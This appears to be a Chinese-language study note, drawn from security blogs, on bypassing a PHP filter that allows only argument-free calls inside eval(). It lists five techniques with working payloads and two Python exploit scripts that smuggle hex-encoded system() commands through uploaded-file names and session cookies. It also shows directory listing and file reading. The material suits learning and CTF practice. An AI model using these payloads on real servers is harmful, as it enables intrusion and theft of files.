无参数RCE和无字母webshell

看了飘零师傅和p牛的博客做一些笔记

eval($_GET['code]');即可getshell

如果存在正则限制

if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
    eval($_GET['code']);
}

即只可执行无参数的函数
允许

a(b(c()))
a()

不允许
a('1')

绕过方法一

利用getenv方法

  1. 使用getenv方法可以返回所有的环境变量，等同于$_ENV，是一个数组；
  2. 使用array_rand方法返回数组中随机一个键；
  3. 使用array_flip方法将数组的键值调换，正常返回需要的数值
  4. 爆破，返回所有数据
    payload ?cmd=var_dump(array_rand(array_flip(getenv())));

绕过方法二

利用getallheaders方法

使用场景 ，中间件是apache

  1. getallheaders方法返回包含当前请求所有头信息的数组；
  2. end方法返回数组最后一条；

payload ?cmd=eval(end(getallheaders()));

绕过方法三

使用 get_defined_vars方法

get_defined_vars方法返回$_GET,$_POST,$_COOKIE,$_FILES数组

  1. 使用current方法返回新添加的数据
  2. 同样利用方法二的方式来达到RCE

碰到禁用了$_GET,$_POST,$_COOKIE时可以使用$_FILES，使用脚本来达到RCE

exp

import requests
from io import BytesIO

payload = "system('ls /tmp');".encode('hex')
files = {
  payload: BytesIO('hahaha')
}

r = requests.post('http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));', files=files, allow_redirects=False)

print r.content

绕过方法四

使用session绕过
通过session_id()返回session id
通过hex编码来写入payload既符合PHPSESSID的规范

exp

import requests
url = 'http://localhost/test.php?code=eval(hex2bin(session_id(session_start())));'
payload = "system('ls ./');".encode('hex')
cookies = {
'PHPSESSID':payload
}
r = requests.get(url=url,cookies=cookies)
print r.content

绕过方法五

使用dirname() & chdir()直接读取文件

用到的函数
getcwd() 获取当前目录
dirname() 返回路径中的目录部分
chdir() 改变目录
scandir() 列出指定路径中的文件和目录
这几个函数配合使用即可达到目录遍历效果

payload
遍历当前目录 ?code=var_dump(scandir(getcwd()));
遍历上级目录?code=var_dump(scandir(dirname(getcwd())));
读取文件 ?code=readfile(next(array_reverse(scandir(getcwd()))))
